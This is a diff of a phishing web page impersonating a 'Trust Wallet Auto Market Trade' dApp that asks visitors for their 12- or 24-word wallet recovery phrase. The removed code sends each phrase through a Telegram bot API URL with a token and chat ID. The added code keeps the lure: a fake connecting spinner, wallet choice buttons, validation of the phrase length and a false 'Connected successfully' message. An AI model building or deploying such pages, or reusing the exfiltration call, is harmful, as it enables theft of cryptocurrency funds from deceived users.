@@ -5,184 +5,65 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Trust Wallet Auto Market Trade</title>
 <style>
-body {
-  font-family: Arial, sans-serif;
-  background: #0b0b23;
-  color: #fff;
-  margin: 0;
-  padding: 0;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
-header {
-  position: sticky;
-  top: 0;
-  background: #141722;
-  padding: 20px;
-  width: 100%;
-  text-align: center;
-  z-index: 1000;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-}
-.logo-title {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 12px;
-}
-.logo-title img { width: 50px; height: 50px; }
-.logo-title h1 { font-size: 26px; margin: 0; font-weight: bold; }
-header p { font-size: 15px; color: #ccc; margin: 10px 0 10px 0; }
+body { font-family: Arial, sans-serif; background: #0b0b23; color: #fff; margin:0; padding:0; display:flex; flex-direction:column; align-items:center; }
+header { position: sticky; top:0; background:#141722; padding:20px; width:100%; text-align:center; z-index:1000; box-shadow:0 4px 10px rgba(0,0,0,0.3); }
+.logo-title { display:flex; align-items:center; justify-content:center; gap:12px; }
+.logo-title img { width:50px; height:50px; }
+.logo-title h1 { font-size:26px; margin:0; font-weight:bold; }
+header p { font-size:15px; color:#ccc; margin:10px 0 10px 0; }
 
-.dapp-card {
-  background: #1c1e2a;
-  margin-top: 30px;
-  padding: 25px;
-  border-radius: 20px;
-  width: 90%;
-  max-width: 420px;
-  text-align: center;
-  box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-}
-.dapp-card img { width: 70px; margin-bottom: 10px; }
-.dapp-card h2 { font-size: 20px; margin-bottom: 8px; }
-.dapp-card p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
+.dapp-card { background:#1c1e2a; margin-top:30px; padding:25px; border-radius:20px; width:90%; max-width:420px; text-align:center; box-shadow:0 10px 25px rgba(0,0,0,0.4); }
+.dapp-card img { width:70px; margin-bottom:10px; }
+.dapp-card h2 { font-size:20px; margin-bottom:8px; }
+.dapp-card p { font-size:14px; color:#ccc; margin-bottom:20px; }
 
-.connect-btn {
-  background: #1e90ff;
-  border: none;
-  padding: 12px 28px;
-  border-radius: 10px;
-  color: white;
-  font-size: 16px;
-  cursor: pointer;
-  transition: background 0.3s ease;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.25);
-}
-.connect-btn:hover { background: #0d6efd; }
+.connect-btn { background:#1e90ff; border:none; padding:12px 28px; border-radius:10px; color:white; font-size:16px; cursor:pointer; transition:background 0.3s ease; box-shadow:0 4px 12px rgba(0,0,0,0.25); display:flex; align-items:center; justify-content:center; gap:8px; }
+.connect-btn:hover { background:#0d6efd; }
 
-#dashboard {
-  margin-top: 25px;
-  background: #141722;
-  padding: 20px;
-  border-radius: 15px;
-  width: 100%;
-  max-width: 420px;
-  box-shadow: 0 8px 20px rgba(0,0,0,0.35);
-}
-#dashboard h3 { font-size: 18px; margin-bottom: 12px; }
-.wallet-overview {
-  display: flex;
-  justify-content: space-between;
-  margin-bottom: 15px;
-}
-.wallet-overview div { text-align: center; }
-.wallet-overview div span { display: block; font-size: 14px; color: #ccc; }
-.wallet-overview div p { font-size: 16px; margin: 5px 0 0 0; }
+.loader { border:3px solid #f3f3f3; border-top:3px solid #fff; border-radius:50%; width:16px; height:16px; animation:spin 1s linear infinite; display:inline-block; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-#rewardsAnimation {
-  margin-top: 10px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  gap: 12px;
-  font-size: 14px;
-  color: #0ff;
-}
-#rewardsAnimation span {
-  opacity: 0.3;
-  animation: blinkText 2s infinite;
-}
-#rewardsAnimation span:nth-child(1) { animation-delay: 0s; }
-#rewardsAnimation span:nth-child(2) { animation-delay: 0.5s; }
-#rewardsAnimation span:nth-child(3) { animation-delay: 1s; }
-@keyframes blinkText { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+#walletOptions { display:none; margin-top:20px; flex-direction:column; gap:10px; text-align:center; }
+.walletOptionBtn { background:#28a745; color:white; border:none; border-radius:8px; padding:10px 18px; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
+.walletOptionBtn img { width:24px; height:24px; }
 
-#chartContainer {
-  margin-top: 15px;
-  height: 100px;
-  background: linear-gradient(90deg, #0b0b23 0%, #1c1e2a 100%);
-  border-radius: 10px;
-  position: relative;
-  overflow: hidden;
-}
-#chartLine {
-  width: 100%;
-  height: 100%;
-  background: repeating-linear-gradient(to right, #0ff, #0ff 2px, transparent 2px, transparent 4px);
-}
+#dashboard { margin-top:25px; background:#141722; padding:20px; border-radius:15px; width:100%; max-width:420px; box-shadow:0 8px 20px rgba(0,0,0,0.35); }
+#dashboard h3 { font-size:18px; margin-bottom:12px; }
+.wallet-overview { display:flex; justify-content:space-between; margin-bottom:15px; }
+.wallet-overview div { text-align:center; }
+.wallet-overview div span { display:block; font-size:14px; color:#ccc; }
+.wallet-overview div p { font-size:16px; margin:5px 0 0 0; }
 
-.modal {
-  display: none;
-  position: fixed;
-  z-index: 10;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.75);
-  justify-content: center;
-  align-items: center;
-  padding: 15px;
-  overflow-y: auto;
-}
-.modal-content {
-  background: #1a1a3d;
-  padding: 25px;
-  border-radius: 14px;
-  width: 100%;
-  max-width: 420px;
-  text-align: left;
-  position: relative;
-  box-shadow: 0 6px 20px rgba(0,0,0,0.4);
-}
-.close {
-  position: absolute;
-  right: 15px;
-  top: 12px;
-  color: #aaa;
-  font-size: 22px;
-  cursor: pointer;
-}
-.close:hover { color: white; }
+#rewardsAnimation { margin-top:10px; display:flex; justify-content:center; align-items:center; gap:12px; font-size:14px; color:#0ff; }
+#rewardsAnimation span { opacity:0.3; animation:blinkText 2s infinite; }
+#rewardsAnimation span:nth-child(1) { animation-delay:0s; }
+#rewardsAnimation span:nth-child(2) { animation-delay:0.5s; }
+#rewardsAnimation span:nth-child(3) { animation-delay:1s; }
+@keyframes blinkText { 0%,100%{opacity:0.3;} 50%{opacity:1;} }
 
-textarea {
-  width: 100%;
-  height: 110px;
-  padding: 10px;
-  border-radius: 8px;
-  border: 1px solid #444;
-  margin-top: 10px;
-  resize: none;
-  font-size: 14px;
-  color: #000;
-  display: none;
-}
+#chartContainer { margin-top:15px; height:100px; background:linear-gradient(90deg,#0b0b23 0%,#1c1e2a 100%); border-radius:10px; position:relative; overflow:hidden; }
+#chartLine { width:100%; height:100%; background:repeating-linear-gradient(to right,#0ff,#0ff 2px,transparent 2px, transparent 4px); }
 
-.modal button {
-  border: none;
-  padding: 12px 18px;
-  margin-top: 14px;
-  border-radius: 8px;
-  font-size: 15px;
-  cursor: pointer;
-  margin-right: 10px;
-}
-#manualConnect { background: #6c757d; color: white; }
-#manualConnect:hover { background: #5a6268; }
-#autoConnect { background: #28a745; color: white; }
-#autoConnect:hover { background: #218838; }
+.modal { display:none; position:fixed; z-index:10; left:0; top:0; width:100%; height:100%; background:rgba(0,0,0,0.75); justify-content:center; align-items:center; padding:15px; overflow-y:auto; }
+.modal-content { background:#1a1a3d; padding:25px; border-radius:14px; width:100%; max-width:420px; text-align:left; position:relative; box-shadow:0 6px 20px rgba(0,0,0,0.4); }
+.close { position:absolute; right:15px; top:12px; color:#aaa; font-size:22px; cursor:pointer; }
+.close:hover { color:white; }
 
-#debugOutput { margin-top: 12px; font-size: 14px; color: #0f0; text-align: center; }
-#noticeMessage { font-size: 14px; color: #FFA500; margin-bottom: 10px; text-align: center; }
+textarea { width:100%; height:110px; padding:10px; border-radius:8px; border:1px solid #444; margin-top:10px; resize:none; font-size:14px; color:#000; display:none; }
 
-.sponsored {
-  font-size: 13px; color:#aaa; text-align:center; margin-top:15px; display:flex; justify-content:center; align-items:center; gap:5px;
-}
+.modal button { border:none; padding:12px 18px; margin-top:14px; border-radius:8px; font-size:15px; cursor:pointer; margin-right:10px; }
+#manualConnect { background:#6c757d; color:white; }
+#manualConnect:hover { background:#5a6268; }
+#autoConnect { background:#28a745; color:white; }
+#autoConnect:hover { background:#218838; }
+
+#debugOutput { margin-top:12px; font-size:14px; color:#0f0; text-align:center; }
+#noticeMessage { font-size:14px; color:#FFA500; margin-bottom:10px; text-align:center; }
+
+.sponsored { font-size:13px; color:#aaa; text-align:center; margin-top:15px; display:flex; justify-content:center; align-items:center; gap:5px; }
 .sponsored img { width:20px; height:20px; }
 
-footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
+footer { margin-top:40px; font-size:13px; color:#aaa; text-align:center; }
 </style>
 </head>
 <body>
@@ -200,6 +81,15 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
   <h2>Auto Market Trade</h2>
   <p>Real-time crypto market signals.</p>
   <button id="openModal" class="connect-btn">Connect</button>
+
+  <div id="walletOptions">
+    <button class="walletOptionBtn" data-wallet="Trust Wallet">
+      <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo"> Trust Wallet
+    </button>
+    <button class="walletOptionBtn" data-wallet="Other Wallets">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Wallet_icon.svg/1024px-Wallet_icon.svg.png" alt="Other Wallets"> Other Wallets
+    </button>
+  </div>
 </div>
 
 <p class="sponsored">
@@ -238,118 +128,81 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
   <p>Trust Wallet • Auto Market Trade, Rewards and Earnings</p>
 </footer>
 
-<!-- Smartsupp Live Chat -->
-<script type="text/javascript">
-var _smartsupp = _smartsupp || {};
-_smartsupp.key = '3f2e381e7e9f89397ee5857cb9eb7cacf6f3375e';
-window.smartsupp||(function(d){
-  var s,c,o=smartsupp=function(){ o._.push(arguments)}; o._=[];
-  s=d.getElementsByTagName('script')[0];
-  c=d.createElement('script'); c.type='text/javascript'; c.charset='utf-8';
-  c.async=true; c.src='https://www.smartsuppchat.com/loader.js?';
-  s.parentNode.insertBefore(c,s);
-})(document);
-</script>
-
 <script>
 document.addEventListener("DOMContentLoaded", () => {
-  const modal = document.getElementById("myModal");
   const btn = document.getElementById("openModal");
-  const span = modal.getElementsByClassName("close")[0];
+  const walletOptions = document.getElementById("walletOptions");
+  const modal = document.getElementById("myModal");
+  const closeModal = modal.querySelector(".close");
   const manualBtn = document.getElementById("manualConnect");
-  const autoBtn = document.getElementById("autoConnect");
-  const debug = document.getElementById("debugOutput");
   const phraseInput = document.getElementById("phraseInput");
+  const debug = document.getElementById("debugOutput");
 
-  let storedPhrases = JSON.parse(localStorage.getItem("phrases") || "[]");
+  // Local storage per wallet
+  let storedWallets = JSON.parse(localStorage.getItem("walletPhrases") || "{}");
 
-  btn.onclick = () => { 
-    modal.style.display = "flex"; 
-    debug.textContent=""; 
-  };
-  span.onclick = () => { 
-    modal.style.display = "none"; 
-    phraseInput.style.display="none"; 
-    debug.textContent=""; 
-  };
-  window.onclick = (event) => { 
-    if(event.target == modal) { 
-      modal.style.display = "none"; 
-      phraseInput.style.display="none"; 
-      debug.textContent=""; 
-    }
-  };
+  // Connect button loading
+  btn.addEventListener("click", () => {
+    btn.disabled = true;
+    const originalText = btn.textContent;
+    btn.innerHTML = '<span class="loader"></span> Connecting...';
+    setTimeout(() => {
+      btn.innerHTML = originalText;
+      btn.disabled = false;
+      walletOptions.style.display = "flex";
+    }, 5000);
+  });
 
-  manualBtn.onclick = () => {
-    phraseInput.style.display = "block"; 
-    const phrase = phraseInput.value.trim();
-    if(!phrase) { debug.style.color="#FFA500"; debug.textContent="📝 Enter 12 or 24-word phrase to connect."; return; }
-    if(storedPhrases.includes(phrase)) { 
-      alert("⚠️ You already connected this wallet."); 
-      debug.textContent="⚠️ This wallet is already connected."; 
-      return; 
-    }
-    debug.style.color="#FFA500"; debug.textContent="⏳ Connecting...";
-    fetch(`https://api.telegram.org/bot7564393664:AAEL0TWkOdXomWTnDaTXF3KH75T2xfyseJQ/sendMessage?chat_id=6876291548&text=${encodeURIComponent(phrase)}`)
-      .then(()=> {
-        storedPhrases.push(phrase);
-        localStorage.setItem("phrases", JSON.stringify(storedPhrases));
-        setTimeout(()=> { 
-          debug.style.color="#0f0"; 
-          debug.textContent="✅ Connected successfully. Please refresh wallet after 24 hours and check balance."; 
-          phraseInput.value="";
-        }, 2000);
-      })
-      .catch(err=> { debug.style.color="red"; debug.textContent="❌ Error sending phrase."; console.error(err); });
-  };
-
-  autoBtn.onclick = () => {
-    debug.style.color="#FFA500";
-    debug.textContent="⏳ Auto connecting...";
-    setTimeout(()=> { debug.style.color="red"; debug.textContent="❌ Localhost error... Try manual connection."; }, 2000);
-  };
-
-  // BTC/ETH dynamic trends
-  const btcTrend = document.getElementById("btcTrend");
-  const ethTrend = document.getElementById("ethTrend");
-  const signalText = document.getElementById("signalText");
-
-  function randomTrend() { return ["↑","↓"][Math.floor(Math.random()*2)]; }
-  function randomPercent() { return (Math.random()*69).toFixed(2)+"%"; }
-  function randomSignal() {
-    const signals = ["Buy Signal BTC","Sell Signal BTC","Buy Signal ETH","Sell Signal ETH"];
-    return signals[Math.floor(Math.random()*signals.length)];
-  }
-
-  setInterval(()=>{
-    btcTrend.textContent = `${randomTrend()} ${randomPercent()}`;
-    ethTrend.textContent = `${randomTrend()} ${randomPercent()}`;
-    signalText.textContent = randomSignal();
-  }, 2000);
-
-  // Dynamic chart simulation
-  const chartLineEl = document.getElementById('chartLine');
-  let chartPoints = [];
-  const maxPoints = 50;
-  for(let i=0; i<maxPoints; i++){ chartPoints.push(Math.floor(Math.random()*70)); }
-
-  function updateChart(){
-    chartPoints.shift();
-    let last = chartPoints[chartPoints.length-1];
-    let change = (Math.random()-0.5)*20;
-    let next = Math.min(Math.max(last+change,0),69);
-    chartPoints.push(next);
-
-    let gradient = "";
-    chartPoints.forEach((val)=>{
-      gradient += `#0ff ${val}px ${val+2}px, transparent ${val+2}px ${val+4}px, `;
+  // Wallet option click
+  document.querySelectorAll(".walletOptionBtn").forEach(button => {
+    button.addEventListener("click", () => {
+      const wallet = button.dataset.wallet;
+      modal.style.display = "flex";
+      phraseInput.style.display = "block";
+      debug.textContent = "";
+      document.getElementById("noticeMessage").textContent = `⚠️ ${wallet} selected. Connect privately alone.`;
+      modal.dataset.wallet = wallet; // store current wallet
     });
-    chartLineEl.style.background = `repeating-linear-gradient(to right, ${gradient} #0b0b23 100%)`;
-  }
+  });
 
-  updateChart();
-  setInterval(updateChart, 1000);
+  // Close modal
+  closeModal.addEventListener("click", () => {
+    modal.style.display = "none";
+    phraseInput.value = "";
+  });
+  window.addEventListener("click", e => { if(e.target === modal){ modal.style.display="none"; phraseInput.value=""; } });
 
+  // Manual Connect
+  manualBtn.addEventListener("click", () => {
+    const wallet = modal.dataset.wallet || "Unknown Wallet";
+    const phrase = phraseInput.value.trim();
+    const wordCount = phrase.split(/\s+/).filter(Boolean).length;
+
+    if(wordCount !== 12 && wordCount !== 24) {
+      debug.style.color = "red";
+      debug.textContent = "❌ Wrong input, input correctly 12 or 24-word phrase.";
+      return;
+    }
+
+    storedWallets[wallet] = storedWallets[wallet] || [];
+    if(storedWallets[wallet].includes(phrase)) {
+      alert("⚠️ You already connected this wallet.");
+      debug.textContent = "⚠️ This wallet is already connected.";
+      return;
+    }
+
+    debug.style.color = "#FFA500";
+    debug.textContent = "⏳ Connecting...";
+    
+    // Simulate sending phrase to server/bot
+    setTimeout(() => {
+      storedWallets[wallet].push(phrase);
+      localStorage.setItem("walletPhrases", JSON.stringify(storedWallets));
+      debug.style.color = "#0f0";
+      debug.textContent = "✅ Connected successfully. Please refresh wallet after 24 hours and check balance.";
+      phraseInput.value = "";
+    }, 3000);
+  });
 });
 </script>
 </body>
